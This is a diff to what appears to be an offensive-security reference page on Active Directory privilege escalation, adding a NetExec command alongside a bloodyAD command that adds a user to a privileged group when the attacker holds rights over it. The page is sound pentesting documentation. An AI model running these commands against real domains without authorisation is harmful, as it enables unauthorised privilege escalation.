@@ -9,9 +9,12 @@ weight: 2
 Member principals within a Active Directory group automatically inherits the accesses and privileges granted to that group. If the principal we control have sufficient privileges over a group (`GenericAll`, `GenericWrite`, `AllExtendedRights` or `Self-Membership`), we can add another principal (e.g. a low-priv user) to the group so the principal inherits all access rights granted to the group.
 
 ## Linux Perspective
-From a Linux attacker machine, we can use bloodyAD to add a user to a group.
+From a Linux attacker machine, we can use bloodyAD or NetExec to add a user to a group.
 ```bash
 bloodyAD --host <dc_host> -d <domain> -u <username> -p <password> add groupMember <target_group> <target_user>
+```
+```bash
+nxc smb <dc_host> -u <username> -p <password> -M modify-group -o USER=<target_user> GROUP=<target_group>
 ```
 
 ## Windows Perspective
